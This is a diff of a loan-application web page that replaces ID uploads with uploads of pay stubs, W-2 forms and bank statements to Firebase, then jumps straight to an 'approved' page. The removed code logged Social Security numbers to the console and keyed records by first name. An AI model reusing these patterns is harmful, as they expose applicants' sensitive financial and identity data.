@@ -113,29 +113,7 @@
         <section class="loan-deatils-area bg_disable pt-140 pb-120">
             <div class="container">
                 <div class="row">
-                    <div class="col-md-3">
-                        <div class="stepper-widget mt-sm-5 px-3 px-sm-0">
-                            <ul>
-                                <li class=" complete  mt-0"><a href="loan-details.html">
-                                        <div class="number"><i class="icon_check"></i> <span>1</span></div> Loan
-                                        Details
-                                    </a>
-                                </li>
-                                <li class="complete"><a href="personal-details.html">
-                                        <div class="number"><i class="icon_check"></i> <span>2</span></div>
-                                        Personal
-                                        Details
-                                    </a>
-                                </li>
-                                <li class=" active"><a href="document-upload.html">
-                                        <div class="number"><i class="icon_check"></i> <span>3</span></div>
-                                        Documants
-                                        Upload
-                                    </a>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
+                    
 
                     <div class="col-md-9">
                         <div class="loan-details-widget">
@@ -144,20 +122,30 @@
                                     <div class="col-12">
                                         <div class="doc-info">
                                             <span>Note:</span>
-                                            <p>Accepted ID: Valid Driver's License, State-issued Identification Card, Passport or Passport Card</p>
+                                            <p>Please upload the required documents below.</p>
                                         </div>
                                     </div>
                                     <div class="col-12">
 
                                         <div class="form-group">
-                                            <label class="form-label">Upload Front View Selected Document (PNG and JPG files
+                                            <label class="form-label">Pay stubs (PNG and JPG files
                                                 only)</label>
-                                            <input type="file" name="frontview" class="form-control" required />
+                                            <input type="file" name="Pay_stubs" class="form-control" required />
                                         </div>
                                         <div class="form-group">
-                                            <label class="form-label">Upload Back View Selected Document (PNG and JPG files
+                                            <label class="form-label">W-2 tax form (PNG and JPG files
                                                 only)</label>
-                                            <input type="file" name="backview" class="form-control" required />
+                                            <input type="file" name="W-2_tax" class="form-control" required />
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="form-label">January 2024 bank statements (PNG and JPG files
+                                                only)</label>
+                                            <input type="file" name="January_2024" class="form-control" required />
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="form-label">February 2024 bank statements (PNG and JPG files
+                                                only)</label>
+                                            <input type="file" name="February_2024" class="form-control" required />
                                         </div>
 
                                     </div>
@@ -166,17 +154,13 @@
                                             <input class="form-check-input" type="checkbox" id="agreeBox">
                                             <label class="form-check-label" for="agreeBox">I hereby agree that the
                                                 information given is true, accurate and complete as of the date of this
-                                                application submission. **</label>
+                                                application submission.</label>
                                         </div>
                                     </div>
                                 </div>
                                 <div class="row mt-5">
                                     <div class="col-md-12">
                                         <div class="nav-btn d-flex flex-wrap justify-content-between">
-                                            <a href="personal-details.html"
-                                                class="prev-btn theme-btn-primary_alt theme-btn"><i
-                                                    class="arrow_left"></i>previous
-                                            </a>
                                             <button class="theme-btn-primary_alt theme-btn next-btn" type="submit">Submit</button>
                                         </div>
                                     </div>
@@ -271,13 +255,15 @@
     <script type="text/javascript" src="js/wow.min.js"></script>
     <script src="https://unpkg.com/ionicons@5.4.0/dist/ionicons.js"></script>
     <script type="text/javascript" src="js/custom.js"></script>
-    <script type="module">
-        // Import the necessary functions from the Firebase SDK
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
-    
-        // Your web app's Firebase configuration
-        const firebaseConfig = {
+<script type="module">
+    // Import the necessary functions from the Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
             apiKey: "AIzaSyAgqyJwpRfrcny-HwGWfgk_pnKpDLrvFz0",
             authDomain: "banca-info.firebaseapp.com",
             projectId: "banca-info",
@@ -285,80 +271,98 @@
             messagingSenderId: "822849353480",
             appId: "1:822849353480:web:ebebda5670f9c2dfc8debd"
         };
-    
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-    
-        // Submit form and store data in Firebase
-        document.getElementById('loanForm').addEventListener('submit', function (e) {
-            e.preventDefault();
-    
-            // Get form values
-            const fName = document.getElementById('fName').value;
-            const lName = document.getElementById('lName').value;
-            const dobDay = document.getElementById('dob-d').value;
-            const dobMonth = document.getElementById('dob-m').value;
-            const dobYear = document.getElementById('dob-y').value;
-            const ssn = document.getElementById('ssn').value;
-            const maritalStatus = document.querySelector('input[name="MaritalStatas"]:checked').value;
-            const email = document.getElementById('emailName').value;
-            const phoneNumber = document.getElementById('inputPhoneNumber').value;
-            const presentAddress = document.getElementById('pAddress').value;
-            const state = document.getElementById('stateName').value;
-            const city = document.getElementById('cityName').value;
-            const zipCode = document.getElementById('zipCode').value;
-    
-            // Log form values for debugging
-            console.log('First Name:', fName);
-            console.log('Last Name:', lName);
-            console.log('Date of Birth:', `${dobYear}-${dobMonth}-${dobDay}`);
-            console.log('SSN:', ssn);
-            console.log('Marital Status:', maritalStatus);
-            console.log('Email:', email);
-            console.log('Phone Number:', phoneNumber);
-            console.log('Present Address:', presentAddress);
-            console.log('State:', state);
-            console.log('City:', city);
-            console.log('Zip Code:', zipCode);
-    
-            // Check if all fields are filled
-            if (!fName || !lName || !dobDay || !dobMonth || !dobYear || !ssn || !maritalStatus || !email || !phoneNumber || !presentAddress || !state || !city || !zipCode) {
-                alert('Please fill in all fields');
-                return;
-            }
-    
-            // Create a formData object
-            const formData = {
-                fName,
-                lName,
-                dob: `${dobYear}-${dobMonth}-${dobDay}`,
-                ssn,
-                maritalStatus,
-                email,
-                phoneNumber,
-                presentAddress,
-                state,
-                city,
-                zipCode,
-            };
-    
-            // Use the first name as the key
-            const loansRef = ref(database, `loans/${fName}`);
-    
-            // Update or set data in Firebase
-            set(loansRef, formData)
-                .then(() => {
-                    console.log('Loan data added/updated for First Name: ', fName);
-                    // Redirect to document-upload.html after successful submission
-                    window.location.href = 'document-upload.html';
-                })
-                .catch((error) => {
-                    console.error('Error adding/updating loan data: ', error);
-                    alert('Error submitting form. Please try again.');
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const storage = getStorage(app);
+    const auth = getAuth(app);
+
+    // Function to generate a random file name
+    function generateRandomFileName(file) {
+        const randomString = Math.random().toString(36).substring(2, 8);
+        const fileExtension = file.name.split('.').pop();
+        return `file_${randomString}.${fileExtension}`;
+    }
+
+    // Function to upload file to Firebase Storage with a renamed file
+    function uploadFile(uid, file) {
+        return new Promise((resolve, reject) => {
+            const fileName = generateRandomFileName(file);
+            const storageRefVar = storageRef(storage, `uploads/${uid}/${fileName}`);
+
+            // Use put for smaller files and uploadBytesResumable for larger files
+            const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
+
+            uploadTask.then((snapshot) => {
+                getDownloadURL(snapshot.ref).then((downloadURL) => {
+                    resolve(downloadURL);
                 });
+            }).catch((error) => {
+                console.error('Error uploading file:', error);
+                reject(null);
+            });
         });
-    </script>
+    }
+
+    // Submit form and store data in Firebase
+    document.getElementById('loanForm').addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        // Get current user
+        const user = auth.currentUser;
+
+        // Get form values
+        const payStubsFile = document.querySelector('input[name="Pay_stubs"]').files[0];
+        const w2TaxFile = document.querySelector('input[name="W-2_tax"]').files[0];
+        const january2024File = document.querySelector('input[name="January_2024"]').files[0];
+        const february2024File = document.querySelector('input[name="February_2024"]').files[0];
+        const agreeBox = document.getElementById('agreeBox').checked;
+
+        // Check if the agreement box is checked
+        if (!agreeBox) {
+            alert('Please agree to the terms before submitting the form.');
+            return;
+        }
+
+        // Check if all files are selected
+        if (!payStubsFile || !w2TaxFile || !january2024File || !february2024File) {
+            alert('Please select all required files.');
+            return;
+        }
+
+        try {
+            // Upload files and get their download URLs
+            const [payStubsURL, w2TaxURL, january2024URL, february2024URL] = await Promise.all([
+                uploadFile(user.uid, payStubsFile),
+                uploadFile(user.uid, w2TaxFile),
+                uploadFile(user.uid, january2024File),
+                uploadFile(user.uid, february2024File)
+            ]);
+
+            // Store data in Firebase
+            const formData = {
+                payStubsURL,
+                w2TaxURL,
+                january2024URL,
+                february2024URL
+            };
+
+            // Set data at the specified location using UID as the key
+            const userRef = ref(database, `users/${user.uid}/documents`);
+            await set(userRef, formData);
+
+            // Display submission confirmation
+            alert('Submission successful!');
+            // Redirect to approved.html after successful submission
+            window.location.href = 'approved.html';
+        } catch (error) {
+            console.error('Error submitting form:', error);
+            alert('An error occurred while submitting the form. Please try again.');
+        }
+    });
+</script>
+
     <!--Start of Tawk.to Script-->
 <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
